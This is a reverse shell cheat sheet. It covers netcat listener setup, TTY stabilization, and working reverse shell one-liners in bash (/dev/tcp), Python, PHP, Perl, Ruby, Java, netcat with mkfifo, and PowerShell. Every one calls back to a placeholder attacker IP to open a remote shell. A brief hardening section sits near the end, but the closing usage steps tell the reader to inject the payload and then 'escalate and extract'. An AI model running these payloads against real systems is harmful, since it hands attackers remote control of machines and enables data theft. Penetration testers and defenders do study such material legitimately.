# 🧰 Reverse Shell Cheat Sheet

## 📡 Listener Setup & Shell Stabilization

### Start Listener
```bash
ncat -lvnp <PORT>
```

### Bash Shell Stabilization (after connection)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then:
Ctrl-Z
stty raw -echo
fg
export TERM=xterm
stty rows $(tput lines) columns $(tput cols)
clear
```

---

## 🐚 Bash Reverse Shell
```bash
/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

---

## 🐍 Python Reverse Shell
```bash
python -c 'import socket,os,subprocess;
s=socket.socket();s.connect(("<ATTACKER_IP>",<PORT>));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"]);'
```

---

## 🐘 PHP Reverse Shell
```php
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);
exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 🧪 Perl Reverse Shell
```perl
perl -e 'use Socket;
$i="<ATTACKER_IP>";$p=<PORT>;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
  open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
  exec("/bin/sh -i");
};'
```

---

## 🕸️ Ruby Reverse Shell
```ruby
ruby -rsocket -e 'exit if fork;
c=TCPSocket.new("<ATTACKER_IP>","<PORT>");
while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## ☕ Java Reverse Shell
```java
r = Runtime.getRuntime();
p = r.exec(new String[]{
  "/bin/bash","-c",
  "exec 5<>/dev/tcp/<ATTACKER_IP>/<PORT>;" +
  "cat <&5 | while read l; do $l 2>&5 >&5; done"
});
p.waitFor();
```

---

## 🔧 Netcat Reverse Shell
```bash
rm /tmp/f; mkfifo /tmp/f;
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> <PORT> >/tmp/f
```

---

## 🪟 PowerShell Reverse Shell (Windows)
```powershell
$sm=(New-Object Net.Sockets.TCPClient("<ATTACKER_IP>",<PORT>)).GetStream();
[byte[]]$bt=0..255|%{0};
while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){
  $d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
  $st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
  $sm.Write($st,0,$st.Length)
}
```

---

## 🔐 Hardening / Detection Notes
- Outbound firewall filtering helps prevent shell callbacks.
- Remove common interpreters (`bash`, `python`, `php`) when not needed.
- Use detection rules for outbound socket behavior and reverse shell signatures.
- Proper input sanitization and secure coding are the best defenses.

---

**Usage**:
1. Set up listener.
2. Inject the payload.
3. Stabilize shell (if Linux).
4. Escalate and extract.